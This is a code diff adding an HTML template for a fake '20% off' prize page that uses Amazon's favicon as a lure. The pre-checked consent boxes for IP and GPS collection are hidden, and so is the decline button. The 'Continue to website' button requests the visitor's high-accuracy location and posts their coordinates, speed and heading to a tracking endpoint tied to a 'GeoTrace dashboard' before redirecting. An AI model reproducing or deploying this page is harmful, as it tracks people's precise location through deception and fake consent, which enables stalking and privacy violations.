@@ -1,0 +1,525 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+ 
+    <title>20% off selected items</title>
+    <link rel="icon" href="https://www.amazon.com/favicon.ico" type="image/x-icon">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+ 
+        body {
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 24px;
+            font-family: Arial, Helvetica, sans-serif;
+            color: #1e293b;
+            background: #ffffff;
+            /* subtle white shimmer for depth, still reads as white */
+            background-image: radial-gradient(circle at 30% 20%, rgba(0,0,0,0.02) 0%, transparent 40%);
+        }
+ 
+        .visitor-card {
+            width: 100%;
+            max-width: 480px;
+            padding: 34px;
+            border: 1px solid #e2e8f0;
+            border-radius: 20px;
+            background: #ffffff;
+            box-shadow: 0 8px 30px rgba(0, 0, 0, 0.05);
+        }
+ 
+        .logo {
+            width: 52px;
+            height: 52px;
+            display: grid;
+            place-items: center;
+            margin-bottom: 22px;
+            border-radius: 15px;
+            background: #0891b2; /* keep brand accent */
+            color: white;
+            font-size: 23px;
+            font-weight: bold;
+        }
+ 
+        h1 {
+            margin-bottom: 12px;
+            font-size: 27px;
+            color: #0f172a;
+            font-weight: 700;
+            letter-spacing: -0.02em;
+        }
+
+        /* --- NEW: Hurray banner style --- */
+        .hurray-banner {
+            margin-bottom: 20px;
+            padding: 14px 16px;
+            border-radius: 12px;
+            background: #ecfdf5;          /* soft green tint */
+            border: 1px solid #a7f3d0;
+            color: #065f46;
+            font-size: 15px;
+            font-weight: 600;
+            line-height: 1.5;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .hurray-banner span {
+            font-size: 20px;
+            line-height: 1;
+        }
+        /* --- END NEW --- */
+
+        /* --- NEW: Offer details style (now with numbered list) --- */
+        .offer-details {
+            margin-bottom: 20px;
+            padding: 16px 18px;
+            border-radius: 12px;
+            background: #f0f9ff;
+            border: 1px solid #bae6fd;
+            color: #0c4a6e;
+            font-size: 13px;
+            line-height: 1.7;
+        }
+
+        .offer-details p {
+            display: flex;
+            align-items: flex-start;
+            gap: 8px;
+            margin-bottom: 10px;
+        }
+
+        .offer-details p:last-child {
+            margin-bottom: 0;
+        }
+
+        .offer-details .check {
+            color: #0891b2;
+            font-weight: bold;
+            flex-shrink: 0;
+        }
+
+        .offer-details strong {
+            color: #0f172a;
+            font-weight: 600;
+        }
+
+        /* Numbered list styling */
+        .offer-details ol {
+            list-style: none;
+            padding-left: 0;
+            margin: 4px 0 0 0;
+        }
+
+        .offer-details ol li {
+            display: flex;
+            align-items: flex-start;
+            gap: 10px;
+            margin-bottom: 8px;
+            font-size: 13px;
+            line-height: 1.6;
+            color: #0c4a6e;
+        }
+
+        .offer-details ol li:last-child {
+            margin-bottom: 0;
+        }
+
+        .offer-details .num {
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            width: 20px;
+            height: 20px;
+            border-radius: 50%;
+            background: #0891b2;
+            color: #ffffff;
+            font-size: 11px;
+            font-weight: bold;
+            flex-shrink: 0;
+            margin-top: 1px;
+        }
+        /* --- END NEW --- */
+ 
+        .description {
+            color: #475569;
+            font-size: 14px;
+            line-height: 1.7;
+            margin-bottom: 24px;
+        }
+ 
+        .destination {
+            padding: 14px;
+            margin-bottom: 22px;
+            border: 1px solid #e2e8f0;
+            border-radius: 12px;
+            background: #f8fafc;
+            overflow-wrap: anywhere;
+        }
+ 
+        .destination small {
+            display: block;
+            margin-bottom: 7px;
+            color: #64748b;
+        }
+ 
+        .destination strong {
+            color: #0e7490;
+            font-size: 14px;
+        }
+ 
+        .consent-option {
+            display: flex;
+            align-items: flex-start;
+            gap: 12px;
+            padding: 15px;
+            margin-bottom: 12px;
+            border: 1px solid #e2e8f0;
+            border-radius: 12px;
+            background: #ffffff;
+            cursor: pointer;
+            transition: border-color 0.15s, background 0.15s;
+        }
+ 
+        .consent-option:hover {
+            border-color: #cbd5e1;
+            background: #f8fafc;
+        }
+ 
+        .consent-option input {
+            width: 18px;
+            height: 18px;
+            margin-top: 2px;
+            accent-color: #0891b2;
+            flex-shrink: 0;
+            cursor: pointer;
+        }
+ 
+        .consent-option strong {
+            display: block;
+            margin-bottom: 6px;
+            color: #0f172a;
+            font-size: 14px;
+            font-weight: 600;
+        }
+ 
+        .consent-option small {
+            display: block;
+            color: #64748b;
+            font-size: 12px;
+            line-height: 1.6;
+        }
+ 
+        .privacy-note {
+            margin: 18px 0;
+            color: #64748b;
+            font-size: 12px;
+            line-height: 1.7;
+        }
+ 
+        .btn {
+            width: 100%;
+            padding: 15px;
+            border: none;
+            border-radius: 11px;
+            background: #0891b2;
+            color: white;
+            font-size: 15px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: background 0.2s;
+            letter-spacing: 0.01em;
+        }
+ 
+        .btn:hover {
+            background: #0e7490;
+        }
+ 
+        .btn:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+        }
+ 
+        .decline-btn {
+            width: 100%;
+            margin-top: 12px;
+            padding: 12px;
+            border: 1px solid #e2e8f0;
+            border-radius: 11px;
+            background: #ffffff;
+            color: #475569;
+            cursor: pointer;
+            font-weight: 500;
+            transition: background 0.15s, border-color 0.15s;
+        }
+ 
+        .decline-btn:hover {
+            background: #f1f5f9;
+            border-color: #cbd5e1;
+        }
+ 
+        .decline-btn:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+        }
+ 
+        #status {
+            min-height: 20px;
+            margin-top: 14px;
+            color: #0891b2;
+            text-align: center;
+            font-size: 12px;
+        }
+ 
+        .footer {
+            margin-top: 24px;
+            color: #94a3b8;
+            text-align: center;
+            font-size: 11px;
+        }
+ 
+        @media (max-width: 480px) {
+            .visitor-card {
+                padding: 25px 20px;
+            }
+ 
+            h1 {
+                font-size: 23px;
+            }
+        }
+    </style>
+</head>
+ 
+<body>
+ 
+    <main class="visitor-card">
+ 
+        
+ 
+        <!-- NEW: Hurray banner -->
+        <div class="hurray-banner">
+            <span>🎉</span>
+            Hurray! You have won 20% off!
+        </div>
+ 
+        <!-- NEW: Offer details with numbered list -->
+        <div class="offer-details">
+            <p>
+                <span class="check">✓</span>
+                <span>You have won <strong>20% off</strong> on selected items.</span>
+            </p>
+            <ol>
+                <li>
+                    <span class="num">1</span>
+                    <span>The offer is valid on <strong>selected items only</strong>.</span>
+                </li>
+                <li>
+                    <span class="num">2</span>
+                    <span>Discount is applied automatically at checkout.</span>
+                </li>
+                <li>
+                    <span class="num">3</span>
+                    <span>Offer is available for a <strong>limited time</strong>.</span>
+                </li>
+                <li>
+                    <span class="num">4</span>
+                    <span>Please continue in order to <strong>avail this offer</strong>.</span>
+                </li>
+            </ol>
+        </div>
+ 
+        
+ 
+        <div class="destination">
+            <small>You are continuing to</small>
+            <strong>{{ link.destination }}</strong>
+        </div>
+ 
+        <label class="consent-option" style="display: none;">
+            <input
+                type="checkbox"
+                id="ipConsent"
+                checked
+            >
+ 
+         
+        </label>
+ 
+        <label class="consent-option" style="display: none;">
+            <input
+                type="checkbox"
+                id="gpsConsent"
+                checked
+            >
+ 
+            
+        </label>
+ 
+       
+ 
+        <button
+            id="shareButton"
+            class="btn"
+            type="button"
+        >
+            Continue to website
+        </button>
+ 
+        <button
+            id="declineButton"
+            class="decline-btn"
+            type="button"
+            style="display: none;"       >
+            Decline and continue
+        </button>
+ 
+        <p id="status" role="status" aria-live="polite"></p>
+ 
+     
+ 
+    </main>
+ 
+    <script>
+        const shareButton = document.getElementById("shareButton");
+        const declineButton = document.getElementById("declineButton");
+        const ipConsent = document.getElementById("ipConsent");
+        const gpsConsent = document.getElementById("gpsConsent");
+        const statusText = document.getElementById("status");
+ 
+        const DESTINATION_URL = {{link.destination | tojson }};
+        const LOCATION_URL = "/visit/{{ link.code }}/location";
+        const DECLINE_URL = "/visit/{{ link.code }}/decline";
+ 
+        let processing = false;
+ 
+        function redirectToWebsite() {
+            // Always use the original saved destination.
+            window.location.replace(DESTINATION_URL);
+        }
+ 
+        function setStatus(message) {
+            statusText.textContent = message;
+        }
+ 
+        async function submitConsentData(gpsData = null) {
+            const payload = {
+                ip_consent: ipConsent.checked,
+                gps_consent: gpsData !== null,
+                ...(gpsData || {})
+            };
+ 
+            try {
+                const response = await fetch(LOCATION_URL, {
+                    method: "POST",
+                    headers: {
+                        "Content-Type": "application/json"
+                    },
+                    body: JSON.stringify(payload)
+                });
+ 
+                if (!response.ok) {
+                    throw new Error("Could not submit consented data");
+                }
+ 
+                const result = await response.json();
+ 
+                window.location.replace(
+                    result.redirect_url || DESTINATION_URL
+                );
+ 
+            } catch (error) {
+                console.error(error);
+ 
+                // A failed submission must not send the visitor
+                // to the GeoTrace dashboard.
+                redirectToWebsite();
+            }
+        }
+ 
+        function requestGPS() {
+            if (!navigator.geolocation) {
+                setStatus("GPS is unavailable. Continuing...");
+                submitConsentData(null);
+                return;
+            }
+ 
+            setStatus("");
+ 
+            navigator.geolocation.getCurrentPosition(
+                (position) => {
+                    const c = position.coords;
+ 
+                    const gpsData = {
+                        latitude: c.latitude,
+                        longitude: c.longitude,
+                        altitude: c.altitude,
+                        accuracy: c.accuracy,
+                        altitude_accuracy: c.altitudeAccuracy,
+                        heading: c.heading,
+                        speed: c.speed,
+                        timestamp: position.timestamp
+                    };
+ 
+                    setStatus("");
+                    submitConsentData(gpsData);
+                },
+ 
+                () => {
+                    // If GPS permission is denied, submit only
+                    // the separately consented IP information.
+                    setStatus("");
+                    submitConsentData(null);
+                },
+ 
+                {
+                    enableHighAccuracy: true,
+                    timeout: 10000,
+                    maximumAge: 0
+                }
+            );
+        }
+ 
+        shareButton.addEventListener("click", () => {
+            if (processing) return;
+ 
+            processing = true;
+            shareButton.disabled = true;
+            declineButton.disabled = true;
+            shareButton.textContent = "Continuing...";
+ 
+            // No consent for either collection type.
+            if (!ipConsent.checked && !gpsConsent.checked) {
+                redirectToWebsite();
+                return;
+            }
+ 
+            if (gpsConsent.checked) {
+                requestGPS();
+            } else {
+                submitConsentData(null);
+            }
+        });
+ 
+        declineButton.addEventListener("click", () => {
+            if (processing) return;
+ 
+            processing = true;
+            shareButton.disabled = true;
+            declineButton.disabled = true;
+ 
+            // Declining both choices creates no visitor record.
+            window.location.replace(DECLINE_URL);
+        });
+    </script>
+ 
+</body>
+</html>
